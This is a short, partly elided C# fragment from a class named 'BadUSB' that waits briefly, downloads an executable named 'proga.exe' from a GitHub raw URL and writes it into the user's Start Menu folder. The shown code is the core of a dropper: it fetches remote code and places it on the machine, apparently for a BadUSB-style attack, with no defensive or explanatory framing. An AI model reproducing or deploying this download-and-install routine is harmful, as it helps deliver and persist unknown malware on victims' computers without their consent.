...
namespace Flipper
{
    public class BadUSB
    {
        ...
        {
            Thread.Sleep(2500);
            byte[] Payload = DownloadPayload("https://raw.githubusercontent.com/Spr1nkle/test/main/proga.exe");
			
            if (InstallPayload(Environment.GetFolderPath(Environment.SpecialFolder.StartMenu) + "\\proga.exe", Payload))
            {
            }
        }
